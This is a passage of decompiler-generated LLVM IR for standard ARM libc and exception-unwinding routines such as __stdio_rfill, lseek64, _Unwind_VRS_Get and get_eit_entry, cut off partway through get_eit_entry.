; uselistorder directives
  uselistorder i32 %v5_19b80, { 1, 3, 0, 2 }
  uselistorder i32 %v5_19b7c, { 1, 0 }
  uselistorder i32 %v0_19bf4, { 1, 0 }
  uselistorder i32 %v1_19bec, { 0, 2, 1 }
  uselistorder i32 %v0_19be8, { 1, 0 }
  uselistorder i32 %v0_19c04.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_19bb4, { 1, 0, 2 }
  uselistorder i32 %v2_19bb4, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_19b74, { 1, 0, 2, 3 }
  uselistorder i32 %v0_19b6c, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 1, 4, 2, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i8 10, { 4, 5, 0, 6, 1, 2, 3 }
  uselistorder i32 11, { 12, 9, 10, 11, 22, 28, 30, 0, 13, 14, 15, 16, 2, 17, 3, 18, 4, 19, 20, 21, 23, 24, 5, 25, 6, 26, 1, 27, 29, 7, 31, 32, 33, 8, 34 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 2, 1, 0 }
  uselistorder i32 2147483647, { 1, 5, 6, 0, 2, 3, 4 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_19c14, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_19c04, { 1, 0 }
  uselistorder label %dec_label_pc_19bf4, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19bb0, { 1, 0 }
  uselistorder label %dec_label_pc_19b64, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19c24 = load i32, i32* @r4, align 4
  store i32 %v3_19c24, i32* %stack_var_-8, align 4
  %v1_19c28 = add i32 %arg1, 8
  %v1_19c2c = inttoptr i32 %v1_19c28 to i32*
  %v2_19c2c = load i32, i32* %v1_19c2c, align 4
  store i32 %v2_19c2c, i32* @r1, align 4
  %v3_19c2c = add i32 %arg1, 12
  %v4_19c2c = inttoptr i32 %v3_19c2c to i32*
  %v5_19c2c = load i32, i32* %v4_19c2c, align 4
  %v2_19c30 = sub i32 %v5_19c2c, %v2_19c2c
  store i32 %v2_19c30, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_19c38 = inttoptr i32 %arg1 to i16*
  %v4_19c38 = call i32 @__stdio_READ(i16* %v3_19c38, i32 %v2_19c2c, i32 %v2_19c30)
  %v0_19c3c = load i32, i32* @r4, align 4
  %v1_19c3c = add i32 %v0_19c3c, 8
  %v2_19c3c = inttoptr i32 %v1_19c3c to i32*
  %v3_19c3c = load i32, i32* %v2_19c3c, align 4
  store i32 %v3_19c3c, i32* %r2.global-to-local, align 4
  %v2_19c40 = add i32 %v3_19c3c, %v4_19c38
  %v2_19c44 = add i32 %v0_19c3c, 20
  %v3_19c44 = inttoptr i32 %v2_19c44 to i32*
  store i32 %v2_19c40, i32* %v3_19c44, align 4
  %v0_19c48 = load i32, i32* %r2.global-to-local, align 4
  %v1_19c48 = load i32, i32* @r4, align 4
  %v2_19c48 = add i32 %v1_19c48, 16
  %v3_19c48 = inttoptr i32 %v2_19c48 to i32*
  store i32 %v0_19c48, i32* %v3_19c48, align 4
  %v2_19c4c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19c4c, i32* @r4, align 4
  ret i32 %v4_19c38

; uselistorder directives
  uselistorder i32 %v4_19c38, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_19c54 = load i32, i32* @r4, align 4
  store i32 %v3_19c54, i32* %stack_var_-12, align 4
  %v0_19c58 = load i32, i32* @r0, align 4
  %v1_19c58 = inttoptr i32 %v0_19c58 to i16*
  %v2_19c58 = load i16, i16* %v1_19c58, align 2
  %v3_19c58 = zext i16 %v2_19c58 to i32
  store i32 %v3_19c58, i32* %r3.global-to-local, align 4
  %v0_19c5c = load i32, i32* @r1, align 4
  %v2_19c5c = and i32 %v0_19c5c, %v3_19c58
  %v4_19c5c = icmp eq i32 %v2_19c5c, 0
  store i32 %v0_19c58, i32* @r4, align 4
  br i1 %v4_19c5c, label %dec_label_pc_19c6c, label %dec_label_pc_19c7c

dec_label_pc_19c6c:                               ; preds = %entry
  %v1_19c6c = and i32 %v3_19c58, 2176
  %v2_19c6c = icmp eq i32 %v1_19c6c, 0
  br i1 %v2_19c6c, label %dec_label_pc_19c74, label %dec_label_pc_19c88

dec_label_pc_19c74:                               ; preds = %dec_label_pc_19c6c
  %v2_19c74 = or i32 %v0_19c5c, %v3_19c58
  store i32 %v2_19c74, i32* %r3.global-to-local, align 4
  %v1_19c78 = trunc i32 %v2_19c74 to i16
  store i16 %v1_19c78, i16* %v1_19c58, align 2
  %v0_19c7c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19c7c

dec_label_pc_19c7c:                               ; preds = %entry, %dec_label_pc_19c74
  %v0_19c7c = phi i32 [ %v0_19c58, %entry ], [ %v0_19c7c.pre, %dec_label_pc_19c74 ]
  %v1_19c7c = inttoptr i32 %v0_19c7c to i16*
  %v2_19c7c = load i16, i16* %v1_19c7c, align 2
  %v3_19c7c = zext i16 %v2_19c7c to i32
  store i32 %v3_19c7c, i32* %r3.global-to-local, align 4
  %v1_19c80 = and i32 %v3_19c7c, 16
  store i32 %v1_19c80, i32* %r5.global-to-local, align 4
  %v2_19c80 = icmp eq i32 %v1_19c80, 0
  br i1 %v2_19c80, label %dec_label_pc_19cb0, label %dec_label_pc_19c88

dec_label_pc_19c88:                               ; preds = %dec_label_pc_19c6c, %dec_label_pc_19c7c
  store i32 ptrtoint (i32* @global_var_a7e4.1097 to i32), i32* %r3.global-to-local, align 4
  %v0_19c8c = call i32 @__aeabi_read_tp()
  store i32 %v0_19c8c, i32* %r0.global-to-local, align 4
  %v3_19c90 = load i16, i16* @global_var_2447c.761, align 2
  %v4_19c90 = sext i16 %v3_19c90 to i32
  store i32 %v4_19c90, i32* %r3.global-to-local, align 4
  %v3_19c98 = add i32 %v4_19c90, %v0_19c8c
  %v4_19c98 = inttoptr i32 %v3_19c98 to i32*
  store i32 9, i32* %v4_19c98, align 4
  br label %dec_label_pc_19c9c

dec_label_pc_19c9c:                               ; preds = %dec_label_pc_19cb8, %dec_label_pc_19c88
  %v0_19c9c = load i32, i32* @r4, align 4
  %v1_19c9c = inttoptr i32 %v0_19c9c to i16*
  %v2_19c9c = load i16, i16* %v1_19c9c, align 2
  %v3_19c9c = zext i16 %v2_19c9c to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_19ca4 = or i32 %v3_19c9c, 8
  store i32 %v1_19ca4, i32* %r3.global-to-local, align 4
  %v1_19ca8 = trunc i32 %v1_19ca4 to i16
  store i16 %v1_19ca8, i16* %v1_19c9c, align 2
  %v1_19cf0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19ce8

dec_label_pc_19cb0:                               ; preds = %dec_label_pc_19c7c
  %v1_19cb0 = and i32 %v3_19c7c, 64
  %v2_19cb0 = icmp eq i32 %v1_19cb0, 0
  br i1 %v2_19cb0, label %dec_label_pc_19cd8, label %dec_label_pc_19cb8

dec_label_pc_19cb8:                               ; preds = %dec_label_pc_19cb0
  %v0_19cb8 = load i32, i32* @r0, align 4
  %v1_19cb8 = call i32 @__stdio_wcommit(i32 %v0_19cb8)
  store i32 %v1_19cb8, i32* %r0.global-to-local, align 4
  %v2_19cbc = icmp eq i32 %v1_19cb8, 0
  br i1 %v2_19cbc, label %dec_label_pc_19cc4, label %dec_label_pc_19c9c

dec_label_pc_19cc4:                               ; preds = %dec_label_pc_19cb8
  %v0_19cc4 = load i32, i32* @r4, align 4
  %v1_19cc4 = inttoptr i32 %v0_19cc4 to i16*
  %v2_19cc4 = load i16, i16* %v1_19cc4, align 2
  %v3_19cc4 = zext i16 %v2_19cc4 to i32
  store i32 %v3_19cc4, i32* %r3.global-to-local, align 4
  %v1_19cc8 = add i32 %v0_19cc4, 8
  %v2_19cc8 = inttoptr i32 %v1_19cc8 to i32*
  %v3_19cc8 = load i32, i32* %v2_19cc8, align 4
  %v1_19ccc = and i32 %v3_19cc4, 65471
  store i32 %v1_19ccc, i32* %r3.global-to-local, align 4
  %v2_19cd0 = add i32 %v0_19cc4, 28
  %v3_19cd0 = inttoptr i32 %v2_19cd0 to i32*
  store i32 %v3_19cc8, i32* %v3_19cd0, align 4
  %v0_19cd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_19cd4 = trunc i32 %v0_19cd4 to i16
  %v2_19cd4 = load i32, i32* @r4, align 4
  %v3_19cd4 = inttoptr i32 %v2_19cd4 to i16*
  store i16 %v1_19cd4, i16* %v3_19cd4, align 2
  %v0_19cd8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19cd8

dec_label_pc_19cd8:                               ; preds = %dec_label_pc_19cb0, %dec_label_pc_19cc4
  %v2_19ce0 = phi i32 [ %v0_19c7c, %dec_label_pc_19cb0 ], [ %v0_19cd8.pre, %dec_label_pc_19cc4 ]
  %v1_19cd8 = inttoptr i32 %v2_19ce0 to i16*
  %v2_19cd8 = load i16, i16* %v1_19cd8, align 2
  %v3_19cd8 = zext i16 %v2_19cd8 to i32
  %v1_19cdc = or i32 %v3_19cd8, 1
  store i32 %v1_19cdc, i32* %r3.global-to-local, align 4
  %v1_19ce0 = trunc i32 %v1_19cdc to i16
  store i16 %v1_19ce0, i16* %v1_19cd8, align 2
  %v0_19ce4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_19ce4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19ce8

dec_label_pc_19ce8:                               ; preds = %dec_label_pc_19c9c, %dec_label_pc_19cd8
  %v1_19cf0 = phi i32 [ %v1_19cf0.pre, %dec_label_pc_19c9c ], [ %v0_19ce4, %dec_label_pc_19cd8 ]
  %v2_19cec = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19cec, i32* @r4, align 4
  ret i32 %v1_19cf0

; uselistorder directives
  uselistorder i32 %v3_19c58, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19ce8, { 1, 0 }
  uselistorder label %dec_label_pc_19cd8, { 1, 0 }
  uselistorder label %dec_label_pc_19c88, { 1, 0 }
  uselistorder label %dec_label_pc_19c7c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_19cf8 = load i32, i32* @r4, align 4
  %v6_19cf8 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_19d08 = call i32 @memcpy()
  %v0_19d0c = load i32, i32* @r5, align 4
  %v1_19d0c = load i32, i32* @r4, align 4
  %v2_19d0c = add i32 %v1_19d0c, %v0_19d0c
  store i32 %v3_19cf8, i32* @r4, align 4
  store i32 %v6_19cf8, i32* @r5, align 4
  ret i32 %v2_19d0c
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_19d1c = load i32, i32* @r1, align 4
  %v2_19d1c = icmp eq i32 %v0_19d1c, 0
  %v3_19d20 = load i32, i32* @r4, align 4
  store i32 %v3_19d20, i32* %stack_var_-8, align 4
  %v0_19d24 = load i32, i32* @r0, align 4
  store i32 %v0_19d24, i32* %r4.global-to-local, align 4
  br i1 %v2_19d1c, label %dec_label_pc_19d48, label %dec_label_pc_19d2c

dec_label_pc_19d2c:                               ; preds = %entry
  %v1_19d34 = add i32 %v0_19d24, 260
  %v4_19d38 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_19d34)
  %v2_19d3c = icmp eq i32 %v4_19d38, 0
  br i1 %v2_19d3c, label %dec_label_pc_19d4c, label %dec_label_pc_19d48

dec_label_pc_19d48:                               ; preds = %dec_label_pc_19d2c, %entry
  br label %dec_label_pc_19d4c

dec_label_pc_19d4c:                               ; preds = %dec_label_pc_19d2c, %dec_label_pc_19d48
  %storemerge = phi i32 [ 0, %dec_label_pc_19d48 ], [ 1, %dec_label_pc_19d2c ]
  %v1_19d50 = load i32, i32* %r4.global-to-local, align 4
  %v2_19d50 = add i32 %v1_19d50, 256
  %v3_19d50 = inttoptr i32 %v2_19d50 to i32*
  store i32 %storemerge, i32* %v3_19d50, align 4
  %v2_19d54 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19d54, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 1, 2, 0 }
  uselistorder i32* null, { 11, 0, 4, 5, 1, 6, 7, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 2, 22, 23, 24, 25, 26, 8, 27, 28, 29, 30, 31, 3, 32, 33, 34, 37, 35, 36, 50, 38, 10, 39, 40, 41, 42, 43, 44, 45, 46, 47, 9, 48, 49 }
  uselistorder i32 260, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_19d4c, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_19da4, label %dec_label_pc_19d88

dec_label_pc_19d88:                               ; preds = %entry
  %v0_19d8c = call i32 @__aeabi_read_tp()
  %v3_19d90 = load i16, i16* @global_var_2447c.761, align 2
  %v4_19d90 = sext i16 %v3_19d90 to i32
  %v0_19d94 = load i32, i32* %r2.global-to-local, align 4
  %v1_19d94 = sub i32 0, %v0_19d94
  store i32 %v1_19d94, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_19d9c = add i32 %v4_19d90, %v0_19d8c
  %v4_19d9c = inttoptr i32 %v3_19d9c to i32*
  store i32 %v1_19d94, i32* %v4_19d9c, align 4
  %v0_19dac.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19dac

dec_label_pc_19da4:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_19da4 = icmp eq i32 %arg1, 0
  br i1 %v2_19da4, label %dec_label_pc_19db8, label %dec_label_pc_19dac

dec_label_pc_19dac:                               ; preds = %dec_label_pc_19da4, %dec_label_pc_19d88
  %v0_19dac = phi i32 [ %arg1, %dec_label_pc_19da4 ], [ %v0_19dac.pre, %dec_label_pc_19d88 ]
  %v3_19db0 = ashr i32 %v0_19dac, 31
  br label %dec_label_pc_19dbc

dec_label_pc_19db8:                               ; preds = %dec_label_pc_19da4
  br label %dec_label_pc_19dbc

dec_label_pc_19dbc:                               ; preds = %dec_label_pc_19dac, %dec_label_pc_19db8
  %v1_19dc4 = phi i32 [ %v0_19dac, %dec_label_pc_19dac ], [ %tmp8, %dec_label_pc_19db8 ]
  %storemerge = phi i32 [ %v3_19db0, %dec_label_pc_19dac ], [ %tmp, %dec_label_pc_19db8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_19dc4

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 31, { 11, 5, 6, 13, 0, 7, 1, 8, 2, 9, 3, 10, 12, 4 }
  uselistorder i16 8, { 3, 0, 1, 2, 4 }
  uselistorder i16* @global_var_2447c.761, { 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 66, 72, 71, 65, 64, 34, 33, 69, 70, 68, 67, 32, 31, 77, 76, 75, 74, 73, 30, 29, 37, 28, 63, 50, 49, 12, 6, 5, 11, 27, 26, 10, 3, 2, 14, 9, 8, 7, 60, 36, 13, 35, 23, 25, 24, 59, 58, 22, 21, 38, 20, 39, 19, 51, 18, 57, 17, 40, 56, 16, 62, 61, 48, 45, 44, 43, 4, 55, 15, 42, 54, 41, 53, 52, 0, 1, 47, 46 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_19dbc, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_19dcc = icmp eq i32 %regclass, 0
  br i1 %v2_19dcc, label %dec_label_pc_19dd4, label %dec_label_pc_19e04

dec_label_pc_19dd4:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_19dd4
  %v6_19dd8 = icmp eq i32 %representation, 0
  br i1 %v6_19dd8, label %dec_label_pc_19de8, label %bb8

.thread3:                                         ; preds = %dec_label_pc_19dd4
  br label %dec_label_pc_19e10

bb8:                                              ; preds = %bb
  br label %dec_label_pc_19e10

dec_label_pc_19de8:                               ; preds = %bb
  %v3_19de8 = mul i32 %regno, 4
  %v2_19dec = add i32 %v3_19de8, %context
  %v1_19df0 = add i32 %v2_19dec, 4
  %v2_19df0 = inttoptr i32 %v1_19df0 to i32*
  %v3_19df0 = load i32, i32* %v2_19df0, align 4
  %v2_19dfc = bitcast i8* %valuep to i32*
  store i32 %v3_19df0, i32* %v2_19dfc, align 4
  ret i32 0

dec_label_pc_19e04:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_19e04
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_19e04, %bb9
  %v0_19e0c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_19e0c)
  br label %dec_label_pc_19e10

dec_label_pc_19e10:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_19e10, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_19e18 = icmp eq i32 %regclass, 0
  br i1 %v2_19e18, label %dec_label_pc_19e20, label %dec_label_pc_19e50

dec_label_pc_19e20:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_19e20
  %v6_19e24 = icmp eq i32 %representation, 0
  br i1 %v6_19e24, label %dec_label_pc_19e34, label %bb8

.thread3:                                         ; preds = %dec_label_pc_19e20
  br label %dec_label_pc_19e5c

bb8:                                              ; preds = %bb
  br label %dec_label_pc_19e5c

dec_label_pc_19e34:                               ; preds = %bb
  %v3_19e38 = mul i32 %regno, 4
  %v1_19e3c = bitcast i8* %valuep to i32*
  %v2_19e3c = load i32, i32* %v1_19e3c, align 4
  %v2_19e40 = add i32 %v3_19e38, %context
  %v2_19e48 = add i32 %v2_19e40, 4
  %v3_19e48 = inttoptr i32 %v2_19e48 to i32*
  store i32 %v2_19e3c, i32* %v3_19e48, align 4
  ret i32 0

dec_label_pc_19e50:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_19e50
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_19e50, %bb9
  %v0_19e58 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_19e58)
  br label %dec_label_pc_19e5c

dec_label_pc_19e5c:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_19e5c, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_19e64 = add i32 %context, 68
  %v2_19e64 = inttoptr i32 %v1_19e64 to i32*
  %v3_19e64 = load i32, i32* %v2_19e64, align 4
  ret i32 %v3_19e64

; uselistorder directives
  uselistorder i32 68, { 10, 8, 0, 9, 1, 3, 4, 5, 6, 2, 7 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_19e74 = add i32 %exc, 8
  %v2_19e74 = inttoptr i32 %v1_19e74 to i32*
  %v3_19e74 = load i32, i32* %v2_19e74, align 4
  %v2_19e78 = icmp eq i32 %v3_19e74, 0
  br i1 %v2_19e78, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_19e8c = xor i1 %v2_19e78, true
  call void @__pseudo_cond_branch(i1 %v2_19e8c, i32 %v3_19e74)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_19ea4 = call i32 @abort()
  ret i32 %v0_19ea4
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_19eb0 = call i32 @abort()
  ret i32 %v0_19eb0
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_19eb4 = load i32, i32* @r4, align 4
  store i32 %v3_19eb4, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r5.global-to-local, align 4
  %v4_19ec4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 132) to i32*), align 4
  %v2_19ec8 = icmp eq i32 %v4_19ec4, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_19ed4 = add i32 %return_address, -2
  store i32 %v1_19ed4, i32* %r4.global-to-local, align 4
  br i1 %v2_19ec8, label %dec_label_pc_19f0c, label %dec_label_pc_19edc

dec_label_pc_19edc:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_19ec4)
  %v2_19eec = icmp eq i32 %v1_19ed4, 0
  br i1 %v2_19eec, label %.thread, label %dec_label_pc_19f2cthread-pre-split

.thread:                                          ; preds = %dec_label_pc_19edc
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_19ef4 = load i32, i32* %r6.global-to-local, align 4
  %v3_19ef4 = add i32 %v2_19ef4, 16
  %v4_19ef4 = inttoptr i32 %v3_19ef4 to i32*
  store i32 0, i32* %v4_19ef4, align 4
  br label %dec_label_pc_19efc

dec_label_pc_19efc:                               ; preds = %.thread, %.thread10, %dec_label_pc_1a0a4, %dec_label_pc_1a090, %dec_label_pc_1a06c, %dec_label_pc_1a044, %dec_label_pc_19f44
  %v0_19efc = load i32, i32* %r2.global-to-local, align 4
  %v2_19f04 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_19f04, i32* @r4, align 4
  ret i32 %v0_19efc

dec_label_pc_19f0c:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_19f14 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 20) to i32*), align 4
  %v4_19f18 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 48) to i32*), align 4
  store i32 %v4_19f18, i32* %r2.global-to-local, align 4
  %v2_19f1c = sub i32 %v4_19f14, %v4_19f18
  %v3_19f20 = sdiv i32 %v2_19f1c, 8
  store i32 %v3_19f20, i32* %stack_var_-36, align 4
  br label %dec_label_pc_19f2c

dec_label_pc_19f2cthread-pre-split:               ; preds = %dec_label_pc_19edc
  %v3_19f2c.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_19f2c

dec_label_pc_19f2c:                               ; preds = %dec_label_pc_19f2cthread-pre-split, %dec_label_pc_19f0c
  %v0_19f70.pre = phi i32 [ %v1_19ed4, %dec_label_pc_19f2cthread-pre-split ], [ %v4_19f18, %dec_label_pc_19f0c ]
  %v1_19f34 = phi i32 [ %v3_19f2c.pr, %dec_label_pc_19f2cthread-pre-split ], [ %v3_19f20, %dec_label_pc_19f0c ]
  %v2_19f30 = icmp eq i32 %v1_19f34, 0
  br i1 %v2_19f30, label %dec_label_pc_19f44, label %dec_label_pc_19f60.preheader

dec_label_pc_19f60.preheader:                     ; preds = %dec_label_pc_19f2c
  %v2_19f34 = add i32 %v1_19f34, -1
  %v1_19f90 = add i32 %v0_19f70.pre, 8
  br label %dec_label_pc_19f60.outer

dec_label_pc_19f44.loopexit:                      ; preds = %dec_label_pc_19fbc
  br label %dec_label_pc_19f44

dec_label_pc_19f44:                               ; preds = %dec_label_pc_19f44.loopexit, %dec_label_pc_19f2c, %dec_label_pc_1a088
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_19f4c = load i32, i32* %r6.global-to-local, align 4
  %v2_19f4c = add i32 %v1_19f4c, 16
  %v3_19f4c = inttoptr i32 %v2_19f4c to i32*
  store i32 0, i32* %v3_19f4c, align 4
  br label %dec_label_pc_19efc

dec_label_pc_19f54:                               ; preds = %dec_label_pc_19fb0
  %v3_19f54 = icmp ult i32 %storemerge40, %v0_19fb4
  br i1 %v3_19f54, label %dec_label_pc_19f5c, label %dec_label_pc_19fcc

dec_label_pc_19f5c:                               ; preds = %dec_label_pc_19f54
  %v1_19f5c = add nsw i32 %v3_19f68, 1
  br label %dec_label_pc_19f60.outer

dec_label_pc_19f60.outer:                         ; preds = %dec_label_pc_19f5c, %dec_label_pc_19f60.preheader
  %v1_19fbc.ph = phi i32 [ %v1_19f5c, %dec_label_pc_19f5c ], [ 0, %dec_label_pc_19f60.preheader ]
  %v0_19f60.ph = phi i32 [ %v0_19f60, %dec_label_pc_19f5c ], [ %v2_19f34, %dec_label_pc_19f60.preheader ]
  br label %dec_label_pc_19f60

dec_label_pc_19f60:                               ; preds = %dec_label_pc_19f60.outer, %dec_label_pc_19fc4
  %v0_19f60 = phi i32 [ %v1_19fc4, %dec_label_pc_19fc4 ], [ %v0_19f60.ph, %dec_label_pc_19f60.outer ]
  %v2_19f60 = add i32 %v0_19f60, %v1_19fbc.ph
  %tmp = icmp slt i32 %v2_19f60, 0
  %v4_19f64 = zext i1 %tmp to i32
  %v5_19f64 = add i32 %v4_19f64, %v2_19f60
  %v3_19f68 = sdiv i32 %v5_19f64, 2
  %v3_19f6c = mul i32 %v3_19f68, 8
  store i32 %v3_19f6c, i32* @ip, align 4
  %v2_19f70 = add i32 %v3_19f6c, %v0_19f70.pre
  %v3_19f70 = inttoptr i32 %v2_19f70 to i32*
  %v4_19f70 = load i32, i32* %v3_19f70, align 4
  %v1_19f74 = and i32 %v4_19f70, 1073741824
  %v2_19f74 = icmp eq i32 %v1_19f74, 0
  %v2_19f78 = or i32 %v4_19f70, -2147483648
  %tmp79 = bitcast i32 %v4_19f70 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_19f7c = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_19f74, i32 %v2_19f7c, i32 %v2_19f78
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_19f80 = icmp eq i32 %v2_19f34, %v3_19f68
  store i32 %v2_19f70, i32* %r7.global-to-local, align 4
  br i1 %v9_19f80, label %dec_label_pc_19fb0, label %dec_label_pc_19f90

dec_label_pc_19f90:                               ; preds = %dec_label_pc_19f60
  %v2_19f94 = add i32 %v3_19f6c, %v1_19f90
  %v3_19f94 = inttoptr i32 %v2_19f94 to i32*
  %v4_19f94 = load i32, i32* %v3_19f94, align 4
  %v1_19f9c = and i32 %v4_19f94, 1073741824
  %v2_19f9c = icmp eq i32 %v1_19f9c, 0
  %v2_19fa0 = or i32 %v4_19f94, -2147483648
